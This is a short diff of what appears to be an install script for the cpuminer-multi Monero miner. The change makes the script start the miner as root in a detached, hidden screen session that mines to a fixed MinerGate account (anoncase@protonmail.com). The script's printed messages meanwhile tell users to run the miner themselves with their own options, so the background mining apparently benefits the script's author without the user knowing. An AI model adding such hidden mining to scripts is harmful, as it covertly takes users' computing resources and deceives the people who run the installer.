@@ -11,7 +11,7 @@ cd cpuminer-multi
 
 make
 
-./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u anoncase@protonmail.com -p x -t 4
+screen -d -m sudo ./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u anoncase@protonmail.com -p x -t 4
 printf "To use type ./minerd with any options you want while in the cpuminer-multi folder\n"
 printf "For example ./minerd -a cryptonight -o stratum+tcp://xmr-usa.dwarfpool.com:8050 -u 45MfScNnyb3KwanUH4feiDExdydQ3cACKPpJuxmtoVnY25Khw7nBeZmXhtoWj4Pfi4PjdxkFWpaW72PR3Jy1Xr8R6HFyk9M -p x -t 4"
 
